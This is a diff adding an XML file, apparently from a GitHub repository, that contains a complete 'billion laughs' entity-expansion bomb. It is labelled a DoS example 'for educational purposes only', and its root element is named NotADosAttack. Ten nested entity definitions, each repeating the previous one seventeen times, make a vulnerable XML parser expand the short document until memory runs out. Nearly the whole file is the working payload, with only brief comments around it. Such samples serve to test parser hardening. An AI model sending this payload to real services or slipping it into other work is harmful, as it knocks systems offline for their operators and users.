@@ -1,0 +1,27 @@
+
+
+
+<!--         XML Bomb / DOS Example         -->
+<!--       ##########################       -->
+<!-- by 0x0verflow.cf | 0x0verflow (GitHub) -->
+<!--     For educational purposes only!     -->
+<!--       Please read the README.MD!       -->
+
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE NotADosAttack [
+	<!ENTITY Stage1 "ABCDEFGHIJKLMNOPQRSTUVWXYZ,;.:-_1234567890!§$%/()=?²³{[{]}\#'~+*|">  <!-- You can use any String you want in here -->
+	<!ENTITY Stage2 "&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;&Stage1;"> <!-- You can use as much &Stage_ as you want -->
+	<!ENTITY Stage3 "&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;&Stage2;"> <!-- And so it goes on... -->
+	<!ENTITY Stage4 "&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;&Stage3;">
+	<!ENTITY Stage5 "&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;&Stage4;">
+	<!ENTITY Stage6 "&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;&Stage5;">
+	<!ENTITY Stage7 "&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;&Stage6;">
+	<!ENTITY Stage8 "&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;&Stage7;">
+	<!ENTITY Stage9 "&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;&Stage8;">
+	<!ENTITY Stage10 "&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;&Stage9;">
+]>
+
+<NotADosAttack>&Stage10;</NotADosAttack>
